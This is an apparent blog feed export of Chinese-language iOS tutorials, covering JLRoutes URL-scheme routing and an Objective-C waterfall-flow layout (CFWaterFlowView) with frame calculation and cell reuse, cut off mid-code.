class="line"></div><div class="line"><span class="class"><span class="keyword">@implementation</span> <span class="title">AppDelegate</span></span></div><div class="line"></div><div class="line"></div><div class="line">- (<span class="built_in">BOOL</span>)application:(<span class="built_in">UIApplication</span> *)application didFinishLaunchingWithOptions:(<span class="built_in">NSDictionary</span> *)launchOptions &#123;</div><div class="line">    [JLRoutes addRoute:<span class="string">@"/:controller"</span> handler:^<span class="built_in">BOOL</span>(<span class="built_in">NSDictionary</span> *parameters) &#123;</div><div class="line">        <span class="built_in">NSString</span> *controller = parameters[<span class="string">@"controller"</span>];</div><div class="line">        </div><div class="line">        [<span class="keyword">self</span>.window.rootViewController presentViewController:[[<span class="built_in">NSClassFromString</span>(controller) alloc] init] animated:<span class="literal">YES</span> completion:^&#123;</div><div class="line">            </div><div class="line">        &#125;];</div><div class="line">        <span class="keyword">return</span> <span class="literal">YES</span>;</div><div class="line">    &#125;];</div><div class="line">    <span class="keyword">return</span> <span class="literal">YES</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">- (<span class="built_in">BOOL</span>)application:(<span class="built_in">UIApplication</span> *)application openURL:(<span class="built_in">NSURL</span> *)url sourceApplication:(<span class="built_in">NSString</span> *)sourceApplication annotation:(<span class="keyword">id</span>)annotation &#123;</div><div class="line">    <span class="keyword">return</span> [JLRoutes routeURL:url];</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<h3 id="URLSchemeDemoTest项目"><a href="#URLSchemeDemoTest项目" class="headerlink" title="URLSchemeDemoTest项目"></a>URLSchemeDemoTest项目</h3><p>当然是改一下我们点击按钮后打开的URL</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">IBAction</span>)jump:(<span class="built_in">UIButton</span> *)sender &#123;</div><div class="line">    <span class="built_in">NSString</span> *customURL = <span class="string">@"URLSchemeDemo://SecondViewController"</span>;</div><div class="line">    [[<span class="built_in">UIApplication</span> sharedApplication] openURL:[<span class="built_in">NSURL</span> URLWithString:customURL]];</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ol>
<li>打开URLSchemeDemoTest应用，点击按钮，就可以直接跳转到URLSchemeDemo的SecondViewController了<br><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94Scheme%E6%98%AF%E4%BB%80%E4%B9%88-%E6%80%8E%E4%B9%88%E8%87%AA%E5%AE%9A%E4%B9%89Scheme-JLRoutes%E7%9A%84%E4%BD%BF%E7%94%A8-11.png-w375" alt=""></li>
</ol>
<h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><p>如果想要源代码，小鱼已经上传了一份，可以在<a href="http://download.csdn.net/detail/u010127917/9387848" target="_blank" rel="external">这里</a>下载</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>JLRoutes是一个非常好用的工具，除了以上简单的用法外，还可以解析更加复杂的URL Scheme，可以参考官方文档：<a href="https://github.com/joeldev/JLRoutes" target="_blank" rel="external">https://github.com/joeldev/JLRoutes</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#99;&#x6f;&#x64;&#x65;&#114;&#102;&#x69;&#115;&#104;&#64;&#x31;&#54;&#x33;&#46;&#x63;&#111;&#x6d;">&#99;&#x6f;&#x64;&#x65;&#114;&#102;&#x69;&#115;&#104;&#64;&#x31;&#54;&#x33;&#46;&#x63;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;转到移动端开发后居然现在才用到Scheme真是惭愧惭愧。&lt;/p&gt;
&lt;h1 id=&quot;URL-Scheme是什么&quot;&gt;&lt;a href=&quot;#URL-Scheme是什么&quot; class=&quot;headerlink&quot; title=&quot;URL Scheme是什么&quot;&gt;&lt;/a&gt;URL Scheme是什么&lt;/h1&gt;&lt;p&gt;相信大家都知道URL。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.apple.com就是一个URL。&quot;&gt;http://www.apple.com就是一个URL。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;而://之前的部分就称为Scheme&lt;/p&gt;
&lt;p&gt;（所以，你看，其实并没有什么难的，在这里多插一句给新人的话：不要看到新东西就觉得难，其实很多时候难的就是在于你看到新事物而不敢去研究）&lt;/p&gt;
&lt;p&gt;也就是说&lt;a href=&quot;http://www.apple.com的Scheme就是http。&quot;&gt;http://www.apple.com的Scheme就是http。&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;iOS中的URL-Scheme&quot;&gt;&lt;a href=&quot;#iOS中的URL-Scheme&quot; class=&quot;headerlink&quot; title=&quot;iOS中的URL Scheme&quot;&gt;&lt;/a&gt;iOS中的URL Scheme&lt;/h1&gt;&lt;p&gt;iOS中的Scheme也是一样的，无非是定义应用自己的Scheme，然后定义一些自己的URL解析，就好像YourApp://OneController?username=xxx&amp;amp;userInput=xxx&lt;/p&gt;
&lt;p&gt;有了这些URL Scheme你可以像网页跳转一样通过URL来传递参数、信息。&lt;/p&gt;
&lt;p&gt;比如常见的分享功能，从其他应用点击微信分享，会自动跳转到微信APP的朋友圈发表动态页面，并填好相应的动态内容。你可以想象一下其URL Scheme可能是这样的：weixin://dl/moments?content=”今天在学习URL Scheme”&amp;amp;src=”zhoulingyu.com”（我只是举个例子）&lt;/p&gt;
&lt;p&gt;有一点需要注意的是，和Web开发不同，iOS中并不是所有的页面或者操作都有URL Schemes，这完全是由你主导的的，如果你需要，你就可以自己定义一些，并去解析。&lt;/p&gt;
&lt;h1 id=&quot;自定义你应用的Scheme&quot;&gt;&lt;a href=&quot;#自定义你应用的Scheme&quot; class=&quot;headerlink&quot; title=&quot;自定义你应用的Scheme&quot;&gt;&lt;/a&gt;自定义你应用的Scheme&lt;/h1&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS——教你如何实现瀑布流</title>
    <link href="http://zhoulingyu.com/2015/12/01/iOS%E2%80%94%E2%80%94%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%80%91%E5%B8%83%E6%B5%81/"/>
    <id>http://zhoulingyu.com/2015/12/01/iOS——教你如何实现瀑布流/</id>
    <published>2015-12-01T02:07:19.000Z</published>
    <updated>2016-08-05T06:23:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-GitHub"><a href="#1-GitHub" class="headerlink" title="1 GitHub"></a>1 GitHub</h1><p>博主已经写好了一份瀑布流的框架，如果你想直接使用，可以点击进入<a href="https://github.com/summertian4/iOS-CFWaterFlowView" target="_blank" rel="external">CFWaterFlowView</a>的项目主页。</p>
<p><a href="https://github.com/summertian4/iOS-CFWaterFlowView" target="_blank" rel="external">CFWaterFlowView</a>是博主已经封装好的瀑布流框架，轻量级、简单、易用，希望你喜欢。</p>
<h1 id="2-简介"><a href="#2-简介" class="headerlink" title="2 简介"></a>2 简介</h1><p>瀑布流是一种非常常用的UI布局，可以为用户带来沉浸式的体验，不需要打断用户的阅读。非常适合带图片信息的展示。</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-CFWaterFlowView-show-02.jpg-w375" alt="CFWaterFlowView展示"></p>
<p><img src="http://www.hong16.net/wp-content/uploads/2015/03/v3.jpg" alt="瀑布流样式示例"></p>
<a id="more"></a>
<h1 id="3-思路与实现"><a href="#3-思路与实现" class="headerlink" title="3 思路与实现"></a>3 思路与实现</h1><h2 id="3-1-选择什么作为基类"><a href="#3-1-选择什么作为基类" class="headerlink" title="3.1 选择什么作为基类"></a>3.1 选择什么作为基类</h2><p>-&gt; 首先你要想到这个能滚动的布局一定是通过UIScrollView实现的</p>
<p>-&gt; 那么现在有三种选择</p>
<ol>
<li>通过UITableView实现</li>
<li>通过UICollectionView实现</li>
<li>通过UIScrollView实现</li>
</ol>
<p>-&gt; 但是UITableView只能实现每行一个cell，而UICollectionView的每个cell的大小又是相同的<br>-&gt; 那么最后选择通过最基础的UIScrollView实现瀑布流</p>
<h2 id="3-2-如何提供更好的接口"><a href="#3-2-如何提供更好的接口" class="headerlink" title="3.2 如何提供更好的接口"></a>3.2 如何提供更好的接口</h2><p>一般来说，为了使你提供的API更易用，可以参考官方是如何构建自己的类的。</p>
<p>既然瀑布流是通过UIScrollView实现的，又类似于UITableView，有cell的概念，那么久可以参考UITableView的API</p>
<p>所以你需要：</p>
<ol>
<li>定义瀑布流数据源协议<code>CFWaterFlowViewDataSource</code></li>
<li>定义瀑布流代理协议<code>CFWaterFlowViewDelegate</code></li>
<li>定义并实现realoadData方法</li>
</ol>
<p>仿照UITableView做好数据源和代理协议</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#pragma mark - ========================代理定义=======================</span></div><div class="line"><span class="class"><span class="keyword">@protocol</span> <span class="title">CFWaterFlowViewDelegate</span> &lt;<span class="title">UIScrollViewDelegate</span>&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">@optional</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  返回对应索引的cell的高度</div><div class="line"> *</div><div class="line"> *  @param waterFlowView CFWaterFlowView对象</div><div class="line"> *  @param index         索引</div><div class="line"> *</div><div class="line"> *  @return 对应索引的cell的高度</div><div class="line"> */</div><div class="line">- (<span class="built_in">CGFloat</span>)waterFlowView:(<span class="built_in">CFWaterFlowView</span> *)waterFlowView heightAtIndex:(<span class="built_in">NSUInteger</span>)index;</div><div class="line"><span class="comment">/**</span></div><div class="line"> *  点击cell回调</div><div class="line"> *</div><div class="line"> *  @param waterFlowView CFWaterFlowView对象</div><div class="line"> *  @param index         索引</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)waterFlowView:(<span class="built_in">CFWaterFlowView</span> *)waterFlowView didSelectCellAtIndex:(<span class="built_in">NSUInteger</span>)index;</div><div class="line"><span class="comment">/**</span></div><div class="line"> *  返回对应间距类型的间距</div><div class="line"> *</div><div class="line"> *  @param waterFlowView CFWaterFlowView对象</div><div class="line"> *  @param type          间距类型</div><div class="line"> *</div><div class="line"> *  @return 对应间距类型的间距</div><div class="line"> */</div><div class="line">- (<span class="built_in">CGFloat</span>)waterFlowView:(<span class="built_in">CFWaterFlowView</span> *)waterFlowView marginForType:(<span class="built_in">CFWaterFlowViewMarginType</span>)type;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#pragma mark - ========================数据源定义========================</span></div><div class="line"><span class="class"><span class="keyword">@class</span> <span class="title">CFWaterFlowView</span>;</span></div><div class="line"><span class="class"><span class="keyword">@protocol</span> <span class="title">CFWaterFlowViewDataSource</span> &lt;<span class="title">NSObject</span>&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">@required</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  一共多少cell</div><div class="line"> *</div><div class="line"> *  @param waterFlowView CFWaterFlowView对象</div><div class="line"> *</div><div class="line"> *  @return cell总个数，NSUInteger保证正数</div><div class="line"> */</div><div class="line">- (<span class="built_in">NSUInteger</span>)numberOfCellsInWaterFlowView:(<span class="built_in">CFWaterFlowView</span> *)waterFlowView;</div><div class="line"><span class="comment">/**</span></div><div class="line"> *  返回对应索引的cell</div><div class="line"> *</div><div class="line"> *  @param waterFlowView CFWaterFlowView对象</div><div class="line"> *  @param index         索引</div><div class="line"> *</div><div class="line"> *  @return 对应索引的cell</div><div class="line"> */</div><div class="line">- (<span class="built_in">CFWaterFlowViewCell</span> *)waterFlowView:(<span class="built_in">CFWaterFlowView</span> *)waterFlowView cellAtIndex:(<span class="built_in">NSUInteger</span>)index;</div><div class="line"></div><div class="line"><span class="keyword">@optional</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  一共多少列，如果数据源没有设置，默认为2列</div><div class="line"> *</div><div class="line"> *  @param waterFlowView CFWaterFlowView对象</div><div class="line"> *</div><div class="line"> *  @return 瀑布流列数</div><div class="line"> */</div><div class="line">- (<span class="built_in">NSUInteger</span>)numberOfColumnsInWaterFlowView:(<span class="built_in">CFWaterFlowView</span> *)waterFlowView;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>需要注意的是数据源协议中比UITableViewDataSource多出一个方法</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">@optional</span></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  一共多少列，如果数据源没有设置，默认为2列</div><div class="line"> *</div><div class="line"> *  @param waterFlowView CFWaterFlowView对象</div><div class="line"> *</div><div class="line"> *  @return 瀑布流列数</div><div class="line"> */</div><div class="line">- (<span class="built_in">NSUInteger</span>)numberOfColumnsInWaterFlowView:(<span class="built_in">CFWaterFlowView</span> *)waterFlowView;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<p>通过这个方法可以向数据源索取各种类型的间距，间距类型是一个枚举类型，定义如下：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#pragma mark - ========================枚举定义========================</span></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</div><div class="line">    <span class="built_in">CFWaterFlowViewMarginTypeTop</span>,</div><div class="line">    <span class="built_in">CFWaterFlowViewMarginTypeBottom</span>,</div><div class="line">    <span class="built_in">CFWaterFlowViewMarginTypeLeft</span>,</div><div class="line">    <span class="built_in">CFWaterFlowViewMarginTypeRight</span>,</div><div class="line">    <span class="comment">// 列间距</span></div><div class="line">    <span class="built_in">CFWaterFlowViewMarginTypeColumn</span>,</div><div class="line">    <span class="comment">// 上下相邻cell间距</span></div><div class="line">    <span class="built_in">CFWaterFlowViewMarginTypeRow</span></div><div class="line">&#125; <span class="built_in">CFWaterFlowViewMarginType</span>;</div></pre></td></tr></table></figure>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS——教你如何实现瀑布流-01.png-w375" alt="CFWaterFlowView展示"></p>
<p>定义reloadData方法和代理、数据源引用</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#pragma mark - ========================类定义=======================</span></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">CFWaterFlowView</span> : <span class="title">UIScrollView</span></span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  数据源对象</div><div class="line"> */</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">weak</span>) <span class="keyword">id</span>&lt;<span class="built_in">CFWaterFlowViewDataSource</span>&gt; dataSource;</div><div class="line"><span class="comment">/**</span></div><div class="line"> *   代理对象</div><div class="line"> */</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">weak</span>) <span class="keyword">id</span>&lt;<span class="built_in">CFWaterFlowViewDelegate</span>&gt; delegate;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line"> *  刷新数据</div><div class="line"> *  调用该方法会重新向数据源和代理发送请求。获取数据</div><div class="line"> */</div><div class="line">- (<span class="keyword">void</span>)reloadData;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></table></figure>
<h2 id="3-3-reloadData中应该做什么"><a href="#3-3-reloadData中应该做什么" class="headerlink" title="3.3 reloadData中应该做什么"></a>3.3 reloadData中应该做什么</h2><p>reloadData中我们需要：</p>
<ol>
<li>计算每一个cell的尺寸位置，并存放到一个数组<code>@property (nonatomic, strong) NSMutableArray *cellFrames;</code>中</li>
<li>设置contentSize使CFWaterFlowView能够滚动</li>
</ol>
<p>为了计算每一个cell的frame需要获得：</p>
<ol>
<li>cell总数</li>
<li>瀑布流列数</li>
<li>各个类型的边距</li>
<li>每个cell的高度</li>
</ol>
<p>因为代理方法并不是强制实现的，所以我们要设定几个默认值，避免在代理没有实现定义的方法时瀑布流能够正常显示：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 默认cell的高度为50</span></div><div class="line"><span class="meta">#define CFWaterFlowViewDefaultCellH 50</span></div><div class="line"><span class="comment">// 默认瀑布流为3列</span></div><div class="line"><span class="meta">#define CFWaterFlowViewDefaultColumnsCount 3</span></div><div class="line"><span class="comment">// 默认所有间距为10</span></div><div class="line"><span class="meta">#define CFWaterFlowViewDefaultMargin 10</span></div></pre></td></tr></table></figure>
<h2 id="3-4-reloadData的实现"><a href="#3-4-reloadData的实现" class="headerlink" title="3.4 reloadData的实现"></a>3.4 reloadData的实现</h2><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)reloadData &#123;</div><div class="line">    <span class="comment">// 1.计算每一个cell的尺寸位置</span></div><div class="line">    <span class="comment">// cell总数</span></div><div class="line">    <span class="built_in">NSUInteger</span> cellsCount = [<span class="keyword">self</span>.dataSource numberOfCellsInWaterFlowView:<span class="keyword">self</span>];</div><div class="line">    <span class="comment">// 瀑布流列数</span></div><div class="line">    <span class="built_in">NSUInteger</span> columnsCount = [<span class="keyword">self</span> numberOfColumns];</div><div class="line">    </div><div class="line">    <span class="built_in">CGFloat</span> marginTop = [<span class="keyword">self</span> marginForType:<span class="built_in">CFWaterFlowViewMarginTypeTop</span>];</div><div class="line">    <span class="built_in">CGFloat</span> marginBottom = [<span class="keyword">self</span> marginForType:<span class="built_in">CFWaterFlowViewMarginTypeBottom</span>];</div><div class="line">    <span class="built_in">CGFloat</span> marginLeft = [<span class="keyword">self</span> marginForType:<span class="built_in">CFWaterFlowViewMarginTypeLeft</span>];</div><div class="line">    <span class="built_in">CGFloat</span> marginRight = [<span class="keyword">self</span> marginForType:<span class="built_in">CFWaterFlowViewMarginTypeRight</span>];</div><div class="line">    <span class="built_in">CGFloat</span> marginRow = [<span class="keyword">self</span> marginForType:<span class="built_in">CFWaterFlowViewMarginTypeRow</span>];</div><div class="line">    <span class="built_in">CGFloat</span> marginColumn = [<span class="keyword">self</span> marginForType:<span class="built_in">CFWaterFlowViewMarginTypeColumn</span>];</div><div class="line">    </div><div class="line">    <span class="built_in">CGFloat</span> cellW = (<span class="keyword">self</span>.width - marginLeft - marginRight - (columnsCount - <span class="number">1</span>) * marginColumn) / columnsCount;</div><div class="line">    </div><div class="line">    <span class="built_in">CGFloat</span> maxYOfColumns[columnsCount];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; columnsCount; i++) &#123;</div><div class="line">        maxYOfColumns[i] = <span class="number">0.0</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cellsCount; i++) &#123;</div><div class="line">        <span class="built_in">NSUInteger</span> cellColumn = <span class="number">0</span>;</div><div class="line">        <span class="built_in">NSUInteger</span> maxYOfColumn = maxYOfColumns[cellColumn];</div><div class="line">        </div><div class="line">        <span class="comment">// 找到当前最短的一列</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; columnsCount; j++) &#123;</div><div class="line">            <span class="keyword">if</span> (maxYOfColumns[j] &lt; maxYOfColumn) &#123;</div><div class="line">                <span class="comment">// 这个cell将会加在该列</span></div><div class="line">                cellColumn = j;</div><div class="line">                maxYOfColumn = maxYOfColumns[j];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="built_in">CGFloat</span> cellH = [<span class="keyword">self</span> heightAtIndex:i];</div><div class="line">        <span class="built_in">CGFloat</span> cellX = marginLeft + cellColumn * (cellW + marginColumn);</div><div class="line">        </div><div class="line">        <span class="built_in">CGFloat</span> cellY = <span class="number">0</span>;</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> (maxYOfColumn == <span class="number">0.0</span>) &#123; <span class="comment">//第一行需要有间距</span></div><div class="line">            cellY = marginTop;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            cellY = maxYOfColumn + marginRow;</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">        <span class="built_in">CGRect</span> cellFrame = <span class="built_in">CGRectMake</span>(cellX, cellY, cellW, cellH);</div><div class="line">        [<span class="keyword">self</span>.cellFrames addObject:[<span class="built_in">NSValue</span> valueWithCGRect:cellFrame]];</div><div class="line">        </div><div class="line">        <span class="comment">// 更新这一列的最大Y值</span></div><div class="line">        maxYOfColumns[cellColumn] = <span class="built_in">CGRectGetMaxY</span>(cellFrame);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="comment">// 设置contentSize</span></div><div class="line">    <span class="built_in">CGFloat</span> contentH = maxYOfColumns[<span class="number">0</span>];</div><div class="line">    </div><div class="line">    <span class="comment">// 找到当前最短的一列</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; columnsCount; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (maxYOfColumns[i] &gt; contentH) &#123;</div><div class="line">            contentH = maxYOfColumns[i];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    contentH += marginBottom;</div><div class="line">    </div><div class="line">    <span class="keyword">self</span>.contentSize = <span class="built_in">CGSizeMake</span>(<span class="number">0</span>, contentH);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="4-缓存池实现"><a href="#4-缓存池实现" class="headerlink" title="4 缓存池实现"></a>4 缓存池实现</h1><h2 id="4-1-内存浪费-1"><a href="#4-1-内存浪费-1" class="headerlink" title="4.1 内存浪费(1)"></a>4.1 内存浪费(1)</h2><p>在上一步骤中，计算了每个cell的frame，但是并没有予以显示，那么如何显示呢？</p>
<p>最简单的方法当然是：计算好frame -&gt; 新建一个CFWaterFlowViewCell -&gt; 的frame -&gt; 添加到CFWaterFlowView上</p>
<p>但这显然会造成性能问题：<strong>因为处在屏幕之外的cell不需要显示，如果过早创建cell对象，会造成大量的内存浪费</strong></p>
<p>正确的这做法是：先判断cell是否在屏幕显示范围内</p>
<ol>
<li>如果在：创建cell对象 -&gt; 设置frame -&gt; 显示到CFWaterFlowView上</li>
<li>如果不在：暂时不做操作</li>
</ol>
<p>按照以上思想，可以开始实现显示cell。</p>
<p>那么在什么时候可以<code>[self addSubview:cell]</code>呢？</p>
<p>-&gt; 经过上面的分析reloadData中只应该计算每一个cell的frame，不能马上添加。</p>
<p>-&gt; 进一步考虑UIScrollView特性，UIScrollView可以滚动，每次滚动都应该判断当前有哪些cell在屏幕范围内，并予以显示。所以可以考虑在UIScrollView滚动的时候判断、添加cell。</p>
<p>-&gt; UIScrollView在滚动时会调用<code>- (void)layoutSubviews</code>方法，所已在<code>layoutSubviews</code>中对cell进行布局最合适。</p>
<h2 id="4-2-解决内存浪费-1-代码实现："><a href="#4-2-解决内存浪费-1-代码实现：" class="headerlink" title="4.2 解决内存浪费(1)代码实现："></a>4.2 解决内存浪费(1)代码实现：</h2><ol>
<li>首先编写一个方法，能够判断一个frame是否在当前屏幕显示范围内</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> *  判断给定frame是否在显示范围内</div><div class="line"> *</div><div class="line"> *  @param frame</div><div class="line"> *</div><div class="line"> *  @return 给定frame是否在显示范围内</div><div class="line"> */</div><div class="line">- (<span class="built_in">BOOL</span>)isInScreen:(<span class="built_in">CGRect</span>)frame &#123;</div><div class="line">    <span class="comment">// contentOffset.y 滚动到的y值</span></div><div class="line">    <span class="keyword">return</span> (<span class="built_in">CGRectGetMaxY</span>(frame) &gt; <span class="keyword">self</span>.contentOffset.y) &amp;&amp; (<span class="built_in">CGRectGetMinY</span>(frame) &lt; <span class="keyword">self</span>.contentOffset.y + <span class="keyword">self</span>.height);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>实现<code>layoutSubviews</code>方法</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)layoutSubviews &#123;</div><div class="line">    </div><div class="line">    <span class="built_in">NSUInteger</span> cellsCount = <span class="keyword">self</span>.cellFrames.count;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cellsCount; i++) &#123;</div><div class="line">        <span class="comment">// 对应的frame</span></div><div class="line">        <span class="built_in">CGRect</span> cellFrame = [<span class="keyword">self</span>.cellFrames[i] <span class="built_in">CGRectValue</span>];</div><div class="line">        <span class="comment">// 如果该frame在屏幕显示范围内，加载cell</span></div><div class="line">        <span class="built_in">CFWaterFlowViewCell</span> *cell = <span class="keyword">self</span>.displayingCells[@(i)];</div><div class="line">        <span class="keyword">if</span> ([<span class="keyword">self</span> isInScreen:cellFrame]) &#123; <span class="comment">// 在屏幕上</span></div><div class="line">            <span class="keyword">if</span> (cell == <span class="literal">nil</span>) &#123;</div><div class="line">                <span class="comment">// 向代理索取一个cell</span></div><div class="line">                cell = [<span 